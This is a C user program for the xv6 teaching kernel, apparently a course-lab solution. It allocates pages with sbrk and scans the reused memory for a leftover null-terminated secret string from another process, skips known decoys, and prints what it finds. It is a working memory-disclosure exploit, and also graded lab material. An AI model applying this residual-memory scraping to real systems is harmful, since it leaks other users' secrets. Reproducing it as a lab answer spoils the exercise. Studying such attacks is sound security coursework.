#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "kernel/riscv.h"
#include "user/user.h"

#define PAGES_TO_ALLOC   128   
#define PAGE             4096
#define MIN_SECRET_LEN   8
#define MAX_TRIES        6
#define MAX_SECRET_LEN   64   

static int is_alnum(char c);

static int is_alnum(char c){
  if('0' <= c && c <= '9') return 1;
  if('A' <= c && c <= 'Z') return 1;
  if('a' <= c && c <= 'z') return 1;
  return 0;
}

// Steiners attack?
int main(void) {
  int dbg = 0;
  for (int run = 0; run < MAX_TRIES; run++) {
    void *mem = sbrk(PAGE * PAGES_TO_ALLOC);
    if (mem == (void*)-1) exit(1);
    char *buf = (char*)mem;
    int total = PAGE * PAGES_TO_ALLOC;

    int idx = 0;
    while (idx < total) {
      unsigned char cur = (unsigned char)buf[idx];
      unsigned char prev = (idx == 0) ? 0 : (unsigned char)buf[idx - 1];
      if (!is_alnum(cur) || is_alnum(prev)) { idx++; continue; }

      int k = idx;
      while (k < total && is_alnum((unsigned char)buf[k])) k++;
      int length = k - idx;
      if (length < MIN_SECRET_LEN || length > MAX_SECRET_LEN) { idx = k; continue; }

      unsigned char next = (k < total) ? (unsigned char)buf[k] : 0;
      if (next != '\0') { idx = k; continue; }

      char out[MAX_SECRET_LEN + 1];
      int to_copy = (length < MAX_SECRET_LEN) ? length : MAX_SECRET_LEN;
      for (int m = 0; m < to_copy; m++) out[m] = buf[idx + m];
      out[to_copy] = '\0';

      if (strcmp(out, "secret") == 0 ||
          strcmp(out, "attack") == 0 ||
          strcmp(out, "0123456789ABCDEF") == 0 ||
          strcmp(out, "redirection") == 0 ||
          strcmp(out, "parseblock") == 0) {
        idx = k;
        continue;
      }

      if (dbg) {
        printf("CANDIDATE: %s\n", out);
        printf("CONTEXT hex: ");
        int start = idx >= 8 ? idx - 8 : 0;
        int finish = (k + 8 < total) ? k + 8 : total;
        for (int b = start; b < finish; b++) {
          unsigned int v = (unsigned char)buf[b];
          printf("%02x", v);
        }
        printf("\n");
      }

      printf("%s\n", out);
      exit(0);
    }
  }
  exit(0);
}
